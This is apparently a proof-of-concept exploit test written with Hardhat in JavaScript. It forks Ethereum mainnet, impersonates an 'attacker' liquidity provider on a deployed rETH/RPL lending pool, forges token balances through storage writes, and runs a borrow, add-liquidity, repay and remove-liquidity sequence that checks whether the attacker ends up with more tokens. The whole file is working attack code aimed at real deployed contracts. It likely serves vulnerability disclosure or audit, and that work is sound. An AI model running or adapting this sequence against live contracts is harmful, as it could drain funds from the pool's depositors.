const { ethers } = require('hardhat')
const { expect } = require('chai')

function getSlot(userAddress, mappingSlot) {
  return ethers.utils.solidityKeccak256(
      ['uint256', 'uint256'],
      [userAddress, mappingSlot]
  )
}

async function checkSlot(erc20, mappingSlot) {
  const contractAddress = erc20.address
  const userAddress = ethers.constants.AddressZero
  const balanceSlot = getSlot(userAddress, mappingSlot)
  const value = 0xDEADBEEF
  const storageValue = ethers.utils.hexlify(ethers.utils.zeroPad(value, 32))

  await ethers.provider.send(
      'hardhat_setStorageAt',
      [
          contractAddress,
          balanceSlot,
          storageValue
      ]
  )
  return await erc20.balanceOf(userAddress) == value
}

async function findBalanceSlot(erc20) {
  const snapshot = await network.provider.send('evm_snapshot')
  for (let slotNumber = 0; slotNumber < 100; slotNumber++) {
      try {
          if (await checkSlot(erc20, slotNumber)) {
              await ethers.provider.send('evm_revert', [snapshot])
              return slotNumber
          }
      } catch { }
      await ethers.provider.send('evm_revert', [snapshot])
  }
}

describe('PoC', function () {

  before(async () => {
    await hre.network.provider.request({
      method: 'hardhat_reset',
      params: [
        {
          forking: {
            jsonRpcUrl: 'https://mainnet.infura.io/v3/lalaland',
            blockNumber: 17318069
          }
        }
      ]
    })
  })

  it('PoC', async function () {
    // test constants
    const MAX_UINT256 = ethers.BigNumber.from(2).pow(256).sub(1)
    const ONE_ETH = ethers.BigNumber.from('10').pow('18')
    const IERC20_SOURCE = '@openzeppelin/contracts/token/ERC20/IERC20.sol:IERC20'
  
    // pool
    const poolAddr = '0x15315dFc9E2Cc4F7F5456323Ab7010a1A74a337d'
    const PoolContract = await ethers.getContractFactory('PoolRplReth_v_1_1')
    const poolContract = await PoolContract.attach(poolAddr)
    
    // attacker (=LP1)
    const attackerAddr = '0xb19e7D98Df0F2E50339666FC8E571D1663978368'
    
    // loan token (=rETH)
    const loanTokenAddr = '0xae78736cd615f374d3085123a210448e74fc6393'
    const loanToken = await ethers.getContractAt(IERC20_SOURCE, loanTokenAddr)
    const loanTokenBalanceSlot = await findBalanceSlot(loanToken)

    // coll token (=RPL)
    const collTokenAddr = '0xD33526068D116cE69F19A9ee46F0bd304F21A51f'
    const collToken = await ethers.getContractAt(IERC20_SOURCE, collTokenAddr)
    const collTokenBalanceSlot = await findBalanceSlot(collToken)

    // impersonate attacker (=LP1)
    await hre.network.provider.request({
      method: 'hardhat_impersonateAccount',
      params: [attackerAddr],
    })
    const attacker = await ethers.getSigner(attackerAddr)

    // set some ETH
    const newBalanceHex = ONE_ETH.mul(1000).toHexString().replace('0x0', '0x');
    await ethers.provider.send('hardhat_setBalance', [attacker.address, newBalanceHex])
    
    // set some coll token (=rETH)
    const loanTokenBal = ONE_ETH.mul(1000)
    const balanceSlotLoanToken = getSlot(attacker.address, loanTokenBalanceSlot)
    const storageValueLoanToken = ethers.utils.hexlify(ethers.utils.zeroPad(loanTokenBal, 32))
    await ethers.provider.send(
        'hardhat_setStorageAt',
        [
            loanToken.address,
            balanceSlotLoanToken,
            storageValueLoanToken
        ]
    )
    expect(await loanToken.balanceOf(attacker.address)).to.be.equal(loanTokenBal)

    // set some coll token (=RPL)
    const collTokenBal = ONE_ETH.mul(1000)
    const balanceSlotCollToken = getSlot(attacker.address, collTokenBalanceSlot)
    const storageValueCollToken = ethers.utils.hexlify(ethers.utils.zeroPad(collTokenBal, 32))
    await ethers.provider.send(
        'hardhat_setStorageAt',
        [
            collToken.address,
            balanceSlotCollToken,
            storageValueCollToken
        ]
    )
    expect(await collToken.balanceOf(attacker.address)).to.be.equal(collTokenBal)

    // note: need to remove liquidity pre scenario to not conflate any previous LP position
    // value with the effect of add/borrow/remove flow; this wasn't taken into account in the original PoC
    const lpInfoPre = await poolContract.getLpInfo(attacker.address)
    const lpSharesPre = lpInfoPre.sharesOverTime[lpInfoPre.sharesOverTime.length - 1]
    await poolContract.connect(attacker).removeLiquidity(attacker.address, lpSharesPre)
    
    // -------- PoC scenario: add/borrow/remove flow -------- //

    // pre balances
    const preLoanTokenBalAttacker = await loanToken.balanceOf(attacker.address)
    const preCollTokenBalAttacker = await collToken.balanceOf(attacker.address)

    // approve balances
    await collToken.connect(attacker).approve(poolContract.address, MAX_UINT256)
    await loanToken.connect(attacker).approve(poolContract.address, MAX_UINT256);
    
    // do borrow
    let onBehalf = attacker.address
    let sendAmount = '333000000000000000000'
    let minLoanLimit = '3720473436805560000'
    let maxRepayLimit = '4179528893517820822'
    let deadline = MAX_UINT256
    let referralCode = 0
    await poolContract.connect(attacker).borrow(onBehalf, sendAmount, minLoanLimit, maxRepayLimit, deadline, referralCode)

    // add liquidity
    sendAmount = ONE_ETH.mul(10)
    let blockNum = await ethers.provider.getBlockNumber()
    let timestamp = (await ethers.provider.getBlock(blockNum)).timestamp
    await poolContract.connect(attacker).addLiquidity(onBehalf, sendAmount, deadline, referralCode)

    // move forward in time
    await ethers.provider.send('evm_setNextBlockTimestamp', [timestamp + 121])
    await ethers.provider.send('evm_mine')

    // get loan id and repayment amount
    const poolInfo = await poolContract.getPoolInfo()
    const loanIdx = poolInfo._loanIdx.sub(1)
    const loanInfo = await poolContract.loanIdxToLoanInfo(loanIdx)

    // repay
    await poolContract.connect(attacker).repay(loanIdx, attacker.address, loanInfo.repayment)

    // remove liquidity
    const lpInfo = await poolContract.getLpInfo(attacker.address)
    const lpShares = lpInfo.sharesOverTime[lpInfo.sharesOverTime.length - 1]
    await poolContract.connect(attacker).removeLiquidity(attacker.address, lpShares)

    // post balances
    const postLoanTokenBalAttacker = await loanToken.balanceOf(attacker.address)
    const postCollTokenBalAttacker = await collToken.balanceOf(attacker.address)

    console.log('Initial attacker balance (loanToken): ', preLoanTokenBalAttacker.toString())
    console.log('Final attacker balance (loanToken): ', postLoanTokenBalAttacker.toString())
    console.log('Is final bal > initial bal (loanToken): ', postLoanTokenBalAttacker.gt(preLoanTokenBalAttacker))

    console.log('Initial attacker balance (collToken): ', preCollTokenBalAttacker.toString())
    console.log('Final attacker balance (collToken): ', postCollTokenBalAttacker.toString())
    console.log('Is final bal > initial bal (collToken): ', postCollTokenBalAttacker.gt(preCollTokenBalAttacker))
  })
})
